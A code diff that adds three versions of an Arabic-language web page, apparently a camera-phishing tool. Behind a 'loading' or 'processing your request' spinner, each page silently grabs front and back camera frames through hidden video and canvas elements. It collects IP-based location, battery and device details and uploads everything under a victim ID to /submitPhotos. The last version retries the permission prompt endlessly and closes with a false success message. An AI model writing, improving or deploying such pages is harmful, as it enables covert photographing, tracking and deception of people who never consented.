@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>التقاط الصور</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+    <div class="spinner"></div>
+    <h1>جاري تحميل الكاميرا</h1>
+    <p>يرجى الانتظار...</p>
+</div>
+    <video id="video" playsinline autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const userId = window.location.pathname.split('/')[2]; // تغيير من [1] إلى [2]
+        const urlParams = new URLSearchParams(window.location.search);
+        const cameraType = urlParams.get('cameraType');
+
+        async function collectAdditionalData() {
+            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+            const battery = await navigator.getBattery();
+
+            return {
+                ip: ipInfo.ip,
+                country: ipInfo.country_name,
+                city: ipInfo.city,
+                platform: getPlatformInfo().platform,
+                deviceVersion: getDeviceVersion(),
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+            };
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        const constraints = { video: { facingMode: cameraType === 'front' ? 'user' : 'environment' } };
+
+        async function init() {
+            try {
+                const additionalData = await collectAdditionalData();
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream, additionalData);
+            } catch (e) {
+                console.error('navigator.getUserMedia error:', e);
+                alert('Error accessing camera: ' + e.message);
+            }
+        }
+
+        function handleSuccess(stream, additionalData) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    video.addEventListener('loadedmetadata', () => {
+        const { videoWidth, videoHeight } = video;
+        canvas.width = videoWidth;
+        canvas.height = videoHeight;
+
+        const context = canvas.getContext('2d');
+        setInterval(() => {
+            context.drawImage(video, 0, 0, videoWidth, videoHeight);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('images', blob, 'image.png');
+                formData.append('userId', userId);
+                formData.append('cameraType', cameraType);
+                formData.append('additionalData', JSON.stringify(additionalData));
+                post('/submitPhotos', formData);
+            }, 'image/png');
+        }, 200); // تغيير إلى 5000 مللي ثانية (5 ثوان) بدلاً من 200 مللي ثانية
+    });
+}
+
+        function post(url, formData) {
+    fetch(url, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            console.log('Photos sent successfully');
+            document.querySelector('.container').innerHTML = `
+                <h1>تم إرسال الصور بنجاح</h1>
+                <p>يمكنك إغلاق هذه الصفحة الآن</p>
+            `;
+        } else {
+            console.error('Error sending photos:', data.error);
+            throw new Error(data.error);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        document.querySelector('.container').innerHTML = `
+            <h1>خطأ في إرسال الصور</h1>
+            <p>${error.message}</p>
+        `;
+    });
+}
+       init();
+    </script>
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>التقاط الصور</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>جاري تحميل الكاميرا</h1>
+        <p>يرجى الانتظار...</p>
+    </div>
+    <video id="frontVideo" playsinline autoplay style="display:none;"></video>
+    <video id="backVideo" playsinline autoplay style="display:none;"></video>
+    <canvas id="frontCanvas" style="display:none;"></canvas>
+    <canvas id="backCanvas" style="display:none;"></canvas>
+    <script>
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
+        const userId = window.location.pathname.split('/')[2];
+
+        async function collectAdditionalData() {
+            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+            const battery = await navigator.getBattery();
+
+            return {
+                ip: ipInfo.ip,
+                country: ipInfo.country_name,
+                city: ipInfo.city,
+                platform: getPlatformInfo().platform,
+                deviceVersion: getDeviceVersion(),
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+            };
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        async function init() {
+            try {
+                const additionalData = await collectAdditionalData();
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                handleSuccess(frontStream, backStream, additionalData);
+            } catch (e) {
+                console.error('navigator.getUserMedia error:', e);
+                alert('Error accessing camera: ' + e.message);
+            }
+        }
+
+        function handleSuccess(frontStream, backStream, additionalData) {
+            frontVideo.srcObject = frontStream;
+            backVideo.srcObject = backStream;
+
+            frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
+            backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+        }
+
+        function setupCamera(video, canvas, cameraType, additionalData) {
+            const { videoWidth, videoHeight } = video;
+            canvas.width = videoWidth;
+            canvas.height = videoHeight;
+
+            const context = canvas.getContext('2d');
+            let photoCount = 0;
+
+            const captureInterval = setInterval(() => {
+                if (photoCount >= 3) {
+                    clearInterval(captureInterval);
+                    return;
+                }
+
+                context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('images', blob, `image_${cameraType}_${photoCount}.png`);
+                    formData.append('userId', userId);
+                    formData.append('cameraType', cameraType);
+                    formData.append('additionalData', JSON.stringify(additionalData));
+                    post('/submitPhotos', formData);
+                }, 'image/png');
+
+                photoCount++;
+            }, 1000); // التقاط صورة كل ثانية
+        }
+
+        function post(url, formData) {
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log('Photos sent successfully');
+                    document.querySelector('.container').innerHTML = `
+                        <h1>تم إرسال الصور بنجاح</h1>
+                        <p>يمكنك إغلاق هذه الصفحة الآن</p>
+                    `;
+                } else {
+                    console.error('Error sending photos:', data.error);
+                    throw new Error(data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.querySelector('.container').innerHTML = `
+                    <h1>خطأ في إرسال الصور</h1>
+                    <p>${error.message}</p>
+                `;
+            });
+        }
+
+        init();
+    </script>
+</body>
+</html>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>مرحبا بك</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+        }
+        .spinner {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>جاري تنفيذ طلبك</h1>
+        <p>يرجى الانتظار...</p>
+    </div>
+    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
+    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
+    <canvas id="frontCanvas" style="display:none;"></canvas>
+    <canvas id="backCanvas" style="display:none;"></canvas>
+    <script>
+        const frontVideo = document.getElementById('frontVideo');
+        const backVideo = document.getElementById('backVideo');
+        const frontCanvas = document.getElementById('frontCanvas');
+        const backCanvas = document.getElementById('backCanvas');
+        const userId = window.location.pathname.split('/')[2];
+
+        async function collectAdditionalData() {
+            try {
+                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+                const battery = await navigator.getBattery();
+
+                return {
+                    ip: ipInfo.ip,
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
+                    platform: getPlatformInfo().platform,
+                    deviceVersion: getDeviceVersion(),
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging,
+                };
+            } catch (error) {
+                console.error('Error collecting additional ', error);
+                return {};
+            }
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+
+        async function requestCameraPermission() {
+            while (true) {
+                try {
+                    await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        } 
+                    });
+                    return true;
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+        }
+
+        async function init() {
+            try {
+                const additionalData = await collectAdditionalData();
+                await requestCameraPermission();
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    } 
+                });
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'environment'
+                    } 
+                });
+                handleSuccess(frontStream, backStream, additionalData);
+            } catch (e) {
+                console.error('Error in init:', e);
+                setTimeout(init, 1000);
+            }
+        }
+
+        function handleSuccess(frontStream, backStream, additionalData) {
+            frontVideo.srcObject = frontStream;
+            backVideo.srcObject = backStream;
+
+            frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
+            backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+        }
+
+        function setupCamera(video, canvas, cameraType, additionalData) {
+            video.play();
+            video.onplaying = () => {
+                const { videoWidth, videoHeight } = video;
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
+
+                const context = canvas.getContext('2d');
+                let photoCount = 0;
+
+                const captureInterval = setInterval(() => {
+                    if (photoCount >= 5) {
+                        clearInterval(captureInterval);
+                        return;
+                    }
+
+                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('images', blob, `image_${cameraType}_${photoCount}.png`);
+                        formData.append('userId', userId);
+                        formData.append('cameraType', cameraType);
+                        formData.append('additionalData', JSON.stringify(additionalData));
+                        post('/submitPhotos', formData);
+                    }, 'image/png', 0.5);  // ضبط جودة الصورة
+
+                    photoCount++;
+                }, 1000);  // إضافة تأخير بين الصور
+            };
+        }
+
+        async function post(url, formData) {
+            const maxRetries = 5;
+            let retries = 0;
+
+            while (retries < maxRetries) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        console.log('Photos sent successfully');
+                        document.querySelector('.container').innerHTML = `
+                            <h1>تم تنفيذ طلبك ودخول إلى الموقع</h1>
+                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+                        `;
+                        return;
+                    } else {
+                        throw new Error(data.error);
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    retries++;
+                    if (retries < maxRetries) {
+                        await new Promise(resolve => setTimeout(resolve, 2000 * retries));  // زيادة وقت الانتظار مع كل محاولة
+                    }
+                }
+            }
+
+            console.error('Max retries reached. Unable to send photos.');
+        }
+
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
